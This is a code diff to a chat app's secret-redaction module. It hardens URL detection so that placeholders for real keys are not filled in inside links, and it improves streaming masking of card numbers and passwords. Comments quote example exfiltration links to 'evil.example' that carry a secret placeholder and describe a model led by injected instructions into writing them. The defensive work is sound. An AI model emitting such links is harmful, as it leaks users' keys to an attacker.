@@ -259,45 +259,62 @@ function genericizePlaceholders(text) {
 // Restore
 // ---------------------------------------------------------------------------------------------
 
-const URL_END = /[\s"'`>]/;
+const SPACE = /\s/;
+const BARE_URL_START = /(?:https?:\/\/|mailto:|(?:^|[^A-Za-z0-9.-])www\.)$/i;
+const AUTOLINK_START = /<[A-Za-z][A-Za-z0-9+.-]{1,31}:$/;
 
 /**
- * Tracks whether the text read so far ends inside a URL, character by character, so restore() and
+ * Tracks whether the output so far ends inside a URL, character by character, so restore() and
  * the stream restorer decide the same way whatever the chunk boundaries. Placeholders inside a URL
  * are never restored: a model following injected instructions could otherwise write
  * "[Open the dashboard](https://evil.example/?k=[SECRET_1])" and Gode would fill in the real key
- * behind a link the user may click. URL contexts, generous on purpose (not restoring is the safe
- * side): a bare http(s):// run, a markdown link target after "](", an autolink "<scheme:...>".
- * Whitespace and < > " ' ` end every context; ")" also ends a link target.
+ * behind a link the user may click.
+ * URL contexts, generous on purpose (not restoring is the safe side):
+ * - a bare run from "http(s)://", "mailto:" or "www." to the next whitespace;
+ * - a markdown link target "](...)", to its closing ")" (nested parentheses counted, as CommonMark
+ *   does) or whitespace;
+ * - an autolink "<scheme:...>", to ">" or whitespace.
+ * Only those end a context. Quotes, backticks and "<" do not: the chat's markdown renderer
+ * (public/app.js parseInline) keeps them inside link targets and bare URLs, so ending there would
+ * let "https://evil.example/?k='[SECRET_1]" restore the key into the href.
  */
 function createUrlScanner() {
   let recent = ""; // the current run's last characters, enough to spot an opener
   let bare = false;
-  let target = false;
+  let bareIn = null; // 'target' | 'auto' | null: what the bare run started inside, so closing that ends it
+  let depth = 0; // parentheses open in a link target; 0 = not in one
   let auto = false;
   return {
     advance(s) {
       for (let i = 0; i < s.length; i++) {
         const ch = s[i];
-        if (URL_END.test(ch)) {
-          bare = target = auto = false;
+        if (SPACE.test(ch)) {
+          bare = auto = false;
+          bareIn = null;
+          depth = 0;
           recent = "";
           continue;
         }
-        if (ch === "<") {
-          bare = target = auto = false;
-          recent = "<";
-          continue;
+        if (ch === "(") {
+          if (depth) depth += 1;
+          else if (recent.endsWith("]")) depth = 1;
+        } else if (ch === ")" && depth) {
+          depth -= 1;
+          if (!depth && bareIn === "target") bare = false;
+        } else if (ch === ">" && auto) {
+          auto = false;
+          if (bareIn === "auto") bare = false;
         }
-        if (ch === ")") target = false;
         recent = recent.length >= 40 ? recent.slice(-39) + ch : recent + ch;
-        if (ch === "/" && !bare && /https?:\/\/$/i.test(recent)) bare = true;
-        else if (ch === "(" && recent.endsWith("](")) target = true;
-        else if (ch === ":" && !auto && /^<[A-Za-z][A-Za-z0-9+.-]{1,31}:$/.test(recent)) auto = true;
+        if (ch === ":" && !auto && AUTOLINK_START.test(recent)) auto = true;
+        if (!bare && (ch === "/" || ch === ":" || ch === ".") && BARE_URL_START.test(recent)) {
+          bare = true;
+          bareIn = depth ? "target" : auto ? "auto" : null;
+        }
       }
     },
     get inUrl() {
-      return bare || target || auto;
+      return bare || depth > 0 || auto;
     },
   };
 }
@@ -306,6 +323,8 @@ function createUrlScanner() {
  * Replace placeholders that exist in `byPlaceholder`, except inside URLs (createUrlScanner).
  * Returns the restored text from `from` on: text before `from` is context only (the regex's word
  * boundary), already fed to `scanner`; a match starting there is left as it is.
+ * The scanner reads the output (restored values included), since that is what gets rendered: a
+ * restored value that itself starts a URL keeps the next placeholder out of it.
  */
 function restoreText(text, byPlaceholder, { from = 0, scanner = createUrlScanner() } = {}) {
   let out = "";
@@ -323,8 +342,9 @@ function restoreText(text, byPlaceholder, { from = 0, scanner = createUrlScanner
     const before = text.slice(pos, start);
     scanner.advance(before);
     const key = placeholderKey(m[1], m[2]);
-    out += before + (Object.hasOwn(byPlaceholder, key) && !scanner.inUrl ? byPlaceholder[key] : m[0]);
-    scanner.advance(m[0]);
+    const replacement = Object.hasOwn(byPlaceholder, key) && !scanner.inUrl ? byPlaceholder[key] : m[0];
+    out += before + replacement;
+    scanner.advance(replacement);
     pos = end;
   }
   const rest = text.slice(pos);
@@ -381,7 +401,7 @@ function couldBePlaceholder(s, prev, bodies) {
  * Streaming restore. push() returns only text that can no longer be part of a placeholder; the
  * shortest tail that still could ("[", "[PER", "PERSON_1") is held until the next chunk or flush().
  * Concatenated output always equals restore(fullText, map), whatever the chunk boundaries
- * (placeholders inside URLs included: the URL scanner sees the same characters in the same order).
+ * (placeholders inside URLs included: the URL scanner reads the same output in the same order).
  *
  * opts.maskHighRisk: also mask high-risk data the model produced on its own while streaming (see
  * createHighRiskMasker), so a regurgitated card number is never on screen even for a moment.
@@ -411,7 +431,7 @@ function createPlainStreamRestorer(map) {
   const maxHold = Math.max(...bodies.map((b) => b.length + (b.match(/_/g) || []).length)) + 4;
   let pending = "";
   let prev = ""; // last raw character already emitted: context for word boundaries
-  const scanner = createUrlScanner(); // has seen every raw character emitted so far
+  const scanner = createUrlScanner(); // has read everything emitted so far
 
   function holdStart(buf) {
     for (let i = Math.max(0, buf.length - maxHold); i < buf.length; i++) {
@@ -447,11 +467,14 @@ function createPlainStreamRestorer(map) {
 // Incremental high-risk masking (createHighRiskMasker). The detectors need the whole value and a
 // little context before it, so the masker holds back the trailing word (a key, a password after
 // "password:") and, before it, any run of short digit groups a card/IBAN/SSN could still grow from
-// ("4111 1111 "). Released text is checked together with the last MASK_LOOKBACK characters already
-// shown (keywords like "SSN" or "password:" live there).
+// ("4111 1111 "). Detection runs on the last MASK_LOOKBACK characters already shown (keywords like
+// "SSN" or "password:" live there) plus everything held, and a value found across the cut stays
+// held whole: the run and size limits below may otherwise cut through a complete card.
 const MASK_LOOKBACK = 96;
 const MASK_MAX_GROUP_RUN = 64; // longest spaced number kept back: an IBAN is 34 chars + 8 spaces
-const MASK_MAX_HOLD = 4096; // a single "word" longer than this is released anyway (final filter)
+// A single "word" longer than this is released anyway, MASK_MAX_HOLD / 2 at a time so the detector
+// runs once per 2 KB of it rather than once per chunk; the final filter masks it if it is a value.
+const MASK_MAX_HOLD = 4096;
 // A word a spaced card/IBAN/SSN may consist of: short with a digit, or an IBAN's letter group ("NWBK").
 const GROUP_WORD = /^(?:(?=[A-Za-z0-9-]*\d)[A-Za-z0-9-]{1,8}|[A-Z]{4})$/;
 
@@ -466,39 +489,67 @@ function createHighRiskMasker(ownMap) {
   const masked = {};
   let held = "";
   let lookback = "";
+  // held[0, wsEnd) ends with the last whitespace in held (0: none). Kept up to date per push so a
+  // long word does not cost a rescan of everything held on every chunk.
+  let wsEnd = 0;
 
-  /** Index in `buf` before which text can be released. */
-  function cutPoint(buf) {
-    const lastWs = (s, before) => {
-      for (let i = before - 1; i >= 0; i--) if (/\s/.test(s[i])) return i;
-      return -1;
-    };
-    // The trailing word may still grow, unless whitespace already ended it.
-    const tail = /\s$/.test(buf) ? buf.length : lastWs(buf, buf.length) + 1;
-    // Digit groups right before it, one space apart, may be the start of a spaced number.
+  /** Index in `held` before which text can be released. */
+  function cutPoint() {
+    // The trailing word (after the last whitespace) may still grow.
+    const tail = wsEnd;
+    // Digit groups right before it, one space apart, may be the start of a spaced number. Only the
+    // last MASK_MAX_GROUP_RUN characters before the tail can belong to such a run.
+    const floor = Math.max(0, tail - MASK_MAX_GROUP_RUN - 1);
     let start = tail;
-    while (start >= 2 && buf[start - 1] === " ") {
-      const wordStart = lastWs(buf, start - 1) + 1;
-      if (!GROUP_WORD.test(buf.slice(wordStart, start - 1)) || tail - wordStart > MASK_MAX_GROUP_RUN) break;
+    while (start >= 2 && held[start - 1] === " ") {
+      let wordStart = -1;
+      for (let i = start - 2; i >= floor; i--) {
+        if (/\s/.test(held[i])) {
+          wordStart = i + 1;
+          break;
+        }
+      }
+      if (wordStart === -1 && floor === 0) wordStart = 0;
+      if (wordStart === -1 || tail - wordStart > MASK_MAX_GROUP_RUN) break;
+      const word = held.slice(wordStart, start - 1);
+      if (!GROUP_WORD.test(word)) {
+        // A first group glued to punctuation ("IBAN:GB82", "no.4916"): the run may start after the
+        // punctuation, so that part stays held too. Released, the value would begin in text already
+        // shown and be left for the final filter, i.e. on screen until the end of the answer.
+        const glued = /[A-Za-z0-9-]+$/.exec(word);
+        if (glued && glued.index > 0 && GROUP_WORD.test(glued[0])) start = wordStart + glued.index;
+        break;
+      }
       start = wordStart;
     }
-    return Math.max(start, buf.length - MASK_MAX_HOLD);
+    return held.length - start > MASK_MAX_HOLD ? held.length - MASK_MAX_HOLD / 2 : start;
   }
 
-  function release(segment) {
-    if (!segment) return "";
-    const ctx = lookback + segment;
+  /** Release held[0, cut) (all of it when `final`), masking the values wholly inside it. */
+  function release(cut, final) {
+    if (!cut) return "";
+    const base = lookback.length;
+    const ctx = lookback + held;
+    const hits = highRiskHits(ctx, isOwn);
+    if (!final) {
+      // Hits are sorted and never overlap, so at most one spans the cut.
+      const across = hits.find((e) => e.start >= base && e.start - base < cut && e.end - base > cut);
+      if (across && across.end - across.start <= MASK_MAX_HOLD) cut = across.start - base;
+      if (!cut) return "";
+    }
     let out = "";
-    let last = lookback.length;
-    // Only values wholly inside the new text: one that began in text already shown is left for the
-    // final filter, which masks it whole.
-    for (const e of highRiskHits(ctx, isOwn)) {
-      if (e.start < lookback.length) continue;
+    let last = base;
+    for (const e of hits) {
+      // A value that began in text already shown is left for the final filter, which masks it whole.
+      if (e.start < base) continue;
+      if (e.end - base > cut) break;
       out += `${ctx.slice(last, e.start)}[redacted ${e.type}]`;
       last = e.end;
       masked[e.type] = (masked[e.type] || 0) + 1;
     }
-    out += ctx.slice(last);
+    out += ctx.slice(last, base + cut);
+    held = held.slice(cut);
+    wsEnd = Math.max(0, wsEnd - cut);
     lookback = (lookback + out).slice(-MASK_LOOKBACK);
     return out;
   }
@@ -506,17 +557,17 @@ function createHighRiskMasker(ownMap) {
   return {
     push(text) {
       if (!text) return "";
+      const from = held.length;
       held += text;
-      const cut = cutPoint(held);
-      const segment = held.slice(0, cut);
-      held = held.slice(cut);
-      return release(segment);
+      for (let i = held.length - 1; i >= from; i--) {
+        if (/\s/.test(held[i])) {
+          wsEnd = i + 1;
+          break;
+        }
+      }
+      return release(cutPoint(), false);
     },
-    flush() {
-      const segment = held;
-      held = "";
-      return release(segment);
-    },
+    flush: () => release(held.length, true),
     masked: () => ({ ...masked }),
   };
 }
